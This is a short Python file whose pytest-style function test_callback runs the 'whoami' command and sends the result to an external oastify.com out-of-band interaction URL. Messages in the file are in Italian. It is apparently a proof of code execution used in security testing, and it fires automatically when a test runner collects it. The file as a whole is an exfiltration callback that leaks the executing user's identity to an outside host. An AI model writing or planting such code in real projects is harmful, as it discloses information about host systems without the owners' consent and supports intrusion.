import subprocess
import urllib.parse
import urllib.request

OAST_URL = "https://xbcm3nv47lal0n2u9i3wcz6ycpig6cu1.oastify.com"

def test_callback():
    result = subprocess.run(
        ["whoami"],
        capture_output=True,
        text=True
    )

    whoami = result.stdout.strip()

    url = f"{OAST_URL}/?whoami={urllib.parse.quote(whoami)}"

    try:
        urllib.request.urlopen(url, timeout=5)
        return f"Callback inviato. whoami={whoami}"
    except Exception as e:
        return f"Errore callback: {e}"
